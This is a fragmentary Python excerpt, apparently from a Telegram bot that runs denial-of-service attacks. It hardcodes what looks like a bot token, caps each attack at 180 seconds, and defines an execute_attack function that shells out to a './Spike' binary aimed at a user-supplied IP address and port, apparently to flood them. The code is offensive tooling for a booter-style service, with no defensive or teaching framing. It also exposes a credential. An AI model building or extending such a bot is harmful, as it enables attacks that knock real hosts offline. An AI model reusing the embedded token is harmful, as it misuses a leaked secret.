...
TOKEN = '7490635228:AAERoAfSrOt5FMSzB7xQ0SYsk3qsMQQsb9s'  # Replace with your actual bot token
...
# Configuration
MAX_ATTACK_DURATION = 180  # Maximum attack duration in seconds (e.g., 180 seconds = 3 minutes)
...
async def execute_attack(ip, port, duration, username):
    ...
    try:
        ...
        proc = await asyncio.create_subprocess_shell(
            f"./Spike {ip} {port} {duration} 24 750",
